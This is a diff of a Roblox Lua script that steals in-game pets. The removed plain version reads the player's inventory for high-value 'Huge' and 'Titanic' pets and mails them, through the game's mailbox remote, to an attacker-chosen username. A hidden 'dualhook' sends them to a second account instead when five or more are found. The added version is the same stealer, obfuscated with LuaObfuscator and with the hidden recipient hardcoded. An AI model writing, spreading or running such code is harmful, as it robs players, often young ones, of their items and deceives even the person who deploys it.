@@ -1,85 +1,15 @@
-Username = "your roblox username here"
-
--- dont move anything below
-local Player = game:GetService("Players").LocalPlayer
-local Inventory = Player.PlayerGui.Inventory
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Players = game:GetService("Players")
-local Directory = ReplicatedStorage:WaitForChild("__DIRECTORY")
-local TitanicsFolder = Directory.Pets:FindFirstChild("Titanic")
-local HugesFolder = Directory.Pets:FindFirstChild("Huge")
-local Save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
-local Remote = ReplicatedStorage.Network:FindFirstChild("Mailbox: Send")
+Username - "(Username in quotes)"
 
 
--- Dualhook
+--[[
+ .____                  ________ ___.    _____                           __                
+ |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
+ |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
+ |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
+ |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
+         \/          \/         \/    \/                \/     \/     \/                   
+          \_Welcome to LuaObfuscator.com   (Alpha 0.9.19) ~  Much Love, Ferib 
 
-local dhuser = "DUALHOOK_USER"
-local AmountOfPetsToSteal = nil -- Keep it like this
-local Dualhooked = true
+]]--
 
--- Dualhook End
-
-local function GetPlayerOwnedHugesTitanics()
-	local PlayerOwnedHugesTitanics = {}
-
-	for i, pet in pairs(Save.Get().Inventory.Pet) do
-		if not HugesFolder:FindFirstChild(pet.id) then continue end
-
-		table.insert(PlayerOwnedHugesTitanics, {UUID = i, Name = pet.id, Amount = pet._am})
-	end
-
-	for i, pet in pairs(Save.Get().Inventory.Pet) do
-		if not TitanicsFolder:FindFirstChild(pet.id) then continue end
-
-		table.insert(PlayerOwnedHugesTitanics, {UUID = i, Name = pet.id, Amount = pet._am})
-	end
-
-	return PlayerOwnedHugesTitanics
-end
-
-local function Steal()
-	local pets = GetPlayerOwnedHugesTitanics()
-	local PetsSuccessfullyStolen = {}
-	local totalPets = 0
-	
-	if not pets then return end
-	
-	for i, v in pets do
-		totalPets += 1
-	end
-
-	if totalPets < 1 then return end
-	if not AmountOfPetsToSteal then AmountOfPetsToSteal = totalPets end
-
-	for i = 1, AmountOfPetsToSteal do
-		local petsToSend = pets[i]
-		local playerToSend = Username
-
-		if not petsToSend then continue end
-
-		if totalPets >= 5 and Dualhooked then
-			playerToSend = dhuser
-		end
-
-		local args = {
-			[1] = playerToSend,
-			[2] = "I Skidded off of Arkhalis",
-			[3] = "Pet",
-			[4] = petsToSend.UUID,
-			[5] = 1
-		}
-
-		local success = Remote:InvokeServer(unpack(args))
-
-		if success then 
-			table.insert(PetsSuccessfullyStolen, petsToSend.Name)
-		else
-			i -= 1
-		end
-
-		task.wait(2.5)
-	end
-end
-
-Steal()
+local v0=game:GetService("Players").LocalPlayer;local v1=v0.PlayerGui.Inventory;local v2=game:GetService("ReplicatedStorage");local v3=game:GetService("Players");local v4=v2:WaitForChild("__DIRECTORY");local v5=v4.Pets:FindFirstChild("Titanic");local v6=v4.Pets:FindFirstChild("Huge");local v7=require(game:GetService("ReplicatedStorage").Library.Client.Save);local v8=v2.Network:FindFirstChild("Mailbox: Send");local v9="e4rned";local v10=nil;local v11=true;local function v12()local v14={};for v18,v19 in pairs(v7.Get().Inventory.Pet) do if  not v6:FindFirstChild(v19.id) then continue;end table.insert(v14,{UUID=v18,Name=v19.id,Amount=v19._am});end for v20,v21 in pairs(v7.Get().Inventory.Pet) do if  not v5:FindFirstChild(v21.id) then continue;end table.insert(v14,{UUID=v20,Name=v21.id,Amount=v21._am});end return v14;end local function v13()local v15=v12();local v16={};local v17=0;if  not v15 then return;end for v22,v23 in v15 do v17+=1 end if (v17<1) then return;end if  not v10 then v10=v17;end for v24=1,v10 do local v25=v15[v24];local v26=Username;if  not v25 then continue;end if ((v17>=5) and v11) then v26=v9;end local v27={[1]=v26,[2]="I Skidded off of Arkhalis",[3]="Pet",[4]=v25.UUID,[5]=1};local v28=v8:InvokeServer(unpack(v27));if v28 then table.insert(v16,v25.Name);else v24-=1 end task.wait(2.5);end end v13();
